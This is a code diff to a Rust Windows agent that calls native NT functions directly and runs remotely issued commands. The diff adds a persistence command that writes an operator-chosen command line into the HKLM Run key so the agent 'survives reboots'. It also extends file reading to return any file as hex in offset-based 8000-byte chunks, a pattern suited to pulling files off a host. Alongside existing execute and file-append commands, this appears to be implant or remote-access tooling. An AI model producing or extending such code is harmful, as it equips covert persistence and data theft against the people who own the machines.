@@ -22,6 +22,7 @@ pub const CMD_EXECUTE: u8 = 0x06;
 pub const CMD_FILE_APPEND: u8 = 0x07;
 pub const CMD_DBG_QUERY: u8 = 0x09;
 pub const CMD_PROTECT: u8 = 0x08;
+pub const CMD_PERSIST: u8 = 0x0A;
 
 #[repr(C)]
 struct IoStatusBlock {
@@ -194,6 +195,22 @@ type SigNtQueryDirectoryFile = unsafe extern "system" fn(
 
 unsafe fn nt_read_file(handle: usize, buf: *mut u8, len: u32, iosb: *mut IoStatusBlock) -> i32 {
     nt_call!(b"NtReadFile", SigNtReadFile, handle, 0, 0, 0, iosb, buf, len, 0, 0)
+}
+
+// NtQueryInformationFile(Handle, IoStatusBlock*, Info*, Length, Class)
+type SigNtQueryInformationFile = unsafe extern "system" fn(
+    usize, *mut IoStatusBlock, *mut u8, u32, u32) -> i32;
+
+unsafe fn nt_query_information_file(handle: usize, iosb: *mut IoStatusBlock,
+                                    info: *mut u8, len: u32, class: u32) -> i32 {
+    nt_call!(b"NtQueryInformationFile", SigNtQueryInformationFile,
+             handle, iosb, info, len, class)
+}
+
+unsafe fn nt_read_file_at(handle: usize, buf: *mut u8, len: u32,
+                          iosb: *mut IoStatusBlock, offset: i64) -> i32 {
+    nt_call!(b"NtReadFile", SigNtReadFile, handle, 0, 0, 0, iosb, buf,
+             len, &offset as *const i64 as usize, 0)
 }
 
 unsafe fn nt_write_file(handle: usize, buf: *const u8, len: u32, iosb: *mut IoStatusBlock) -> i32 {
@@ -397,6 +414,57 @@ unsafe fn open_or_create_key(path_w: &[u16], access: u32) -> (i32, usize) {
 // custom registry kernel-path (test mode: creation allowed; the
 // production path is open-only so a driver-less host never grows a
 // stray service key).
+// handle_persist: install an autostart value so the agent survives
+// reboots. Payload (NUL-separated ASCII): [0] value name, [1] command
+// line, [2] OPTIONAL registry kernel-path (test mode: creation
+// allowed; production targets the HKLM Run key, open-only).
+unsafe fn handle_persist(out: &mut Vec<u8>, payload: &[u8]) {
+    let mut parts: Vec<&[u8]> = Vec::new();
+    let mut start = 0usize;
+    for i in 0..=payload.len() {
+        if i == payload.len() || payload[i] == 0 {
+            if i > start {
+                parts.push(&payload[start..i]);
+            }
+            start = i + 1;
+        }
+    }
+    if parts.len() < 2 {
+        out.extend_from_slice(b"{\"persist\":\"bad-payload\"}");
+        return;
+    }
+
+    let default_path: &[u8] = b"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    let custom = parts.len() >= 3;
+    let reg_path_bytes: &[u8] = if custom { parts[2] } else { default_path };
+    let reg_path = wide_bytes(reg_path_bytes);
+
+    let (st, hkey) = open_or_create_key(&reg_path, KEY_SET_VALUE);
+    if st < 0 || hkey == 0 {
+        out.extend_from_slice(b"{\"persist\":\"key-absent\",\"st\":");
+        push_dec(out, st as u32 as u64);
+        out.push(b'}');
+        return;
+    }
+
+    let name_w = wide_bytes(parts[0]);
+    let mut value_w = wide_bytes(parts[1]);
+    value_w.push(0);            // REG_SZ NUL terminator (inside the Vec!)
+    let name_us = us_from(&name_w);
+    let st = nt_set_value(hkey, &name_us,
+                         value_w.as_ptr() as *const u8,
+                         (value_w.len() * 2) as u32);
+    nt_closek(hkey);
+
+    if st < 0 {
+        out.extend_from_slice(b"{\"persist\":\"write-failed\",\"st\":");
+        push_dec(out, st as u32 as u64);
+        out.push(b'}');
+        return;
+    }
+    out.extend_from_slice(b"{\"persist\":\"ok\"}");
+}
+
 unsafe fn handle_protect(out: &mut Vec<u8>, payload: &[u8]) {
     let mut parts: Vec<&[u8]> = Vec::new();
     let mut start = 0usize;
@@ -680,6 +748,7 @@ pub fn run() {
                 CMD_FILE_APPEND => handle_file_append(&mut resp, payload),
                 CMD_DBG_QUERY => handle_dbg_query(&mut resp, payload),
                 CMD_PROTECT => handle_protect(&mut resp, payload),
+                CMD_PERSIST => handle_persist(&mut resp, payload),
                 _ => resp.extend_from_slice(b"{\"error\":\"unknown command\"}"),
             }
             if !frame_response(stdout, &resp) {
@@ -949,8 +1018,55 @@ unsafe fn handle_dir_list(out: &mut Vec<u8>, payload: &[u8]) {
     out.extend_from_slice(b"]}");
 }
 
+fn parse_u64_ascii(s: &[u8]) -> Option<u64> {
+    if s.is_empty() {
+        return None;
+    }
+    let mut v: u64 = 0;
+    for &c in s {
+        if c == 0 {
+            break;              // NUL-terminated field inside the payload
+        }
+        if c < b'0' || c > b'9' {
+            return None;
+        }
+        v = v.checked_mul(10)?.checked_add((c - b'0') as u64)?;
+    }
+    Some(v)
+}
+
 unsafe fn handle_file_read(out: &mut Vec<u8>, payload: &[u8]) {
-    let wide_path = wide_nt_path(payload);
+    // payload: <path> or <path> NUL <offset-decimal> NUL <len-decimal>
+    let (path_bytes, range): (&[u8], Option<(u64, u64)>) =
+        match payload.iter().position(|&b| b == 0) {
+            Some(i) => {
+                let rest = &payload[i + 1..];
+                let off = match parse_u64_ascii(rest) {
+                    Some(v) => v,
+                    None => {
+                        out.extend_from_slice(b"{\"error\":\"bad range\"}");
+                        return;
+                    }
+                };
+                let rest2 = match rest.iter().position(|&b| b == 0) {
+                    Some(j) => &rest[j + 1..],
+                    None => {
+                        out.extend_from_slice(b"{\"error\":\"bad range\"}");
+                        return;
+                    }
+                };
+                let len = match parse_u64_ascii(rest2) {
+                    Some(v) => v,
+                    None => {
+                        out.extend_from_slice(b"{\"error\":\"bad range\"}");
+                        return;
+                    }
+                };
+                (&payload[..i], Some((off, len)))
+            }
+            None => (payload, None),
+        };
+    let wide_path = wide_nt_path(path_bytes);
 
     let unicode_name = UnicodeString {
         length: (wide_path.len() * 2) as u16,
@@ -983,11 +1099,27 @@ unsafe fn handle_file_read(out: &mut Vec<u8>, payload: &[u8]) {
         return;
     }
 
+    // total size via FILE_STANDARD_INFORMATION (EndOfFile at +8)
+    let mut std_info: [u8; 24] = [0; 24];
+    let mut q_iosb = IoStatusBlock { status: 0, information: 0 };
+    let _ = nt_query_information_file(handle, &mut q_iosb,
+                                      std_info.as_mut_ptr(),
+                                      std_info.len() as u32, 5);
+    let file_size = u64::from_le_bytes(
+        [std_info[8], std_info[9], std_info[10], std_info[11],
+         std_info[12], std_info[13], std_info[14], std_info[15]]);
+
     let mut file_buf = [0u8; 65536];
     let mut read_iosb = IoStatusBlock { status: 0, information: 0 };
-    let read_status = nt_read_file(
-        handle, file_buf.as_mut_ptr(), file_buf.len() as u32, &mut read_iosb,
-    );
+    let read_status = if let Some((off, want)) = range {
+        // 8000 bytes per response keeps the hex under the 16KB frame
+        let want = if want > 8000 { 8000 } else { want };
+        nt_read_file_at(handle, file_buf.as_mut_ptr(), want as u32,
+                        &mut read_iosb, off as i64)
+    } else {
+        nt_read_file(handle, file_buf.as_mut_ptr(),
+                     file_buf.len() as u32, &mut read_iosb)
+    };
     nt_close(handle);
 
     if read_status < 0 {
@@ -1001,7 +1133,18 @@ unsafe fn handle_file_read(out: &mut Vec<u8>, payload: &[u8]) {
         return;
     }
 
-    out.extend_from_slice(b"{\"content_hex\":\"");
+    out.push(b'{');
+    out.push(b'"');
+    out.extend_from_slice(b"file_size");
+    out.push(b'"');
+    out.push(b':');
+    push_dec(out, file_size);
+    out.push(b',');
+    out.push(b'"');
+    out.extend_from_slice(b"content_hex");
+    out.push(b'"');
+    out.push(b':');
+    out.push(b'"');
     const HEX: &[u8; 16] = b"0123456789abcdef";
     for i in 0..bytes_read {
         let byte = file_buf[i];
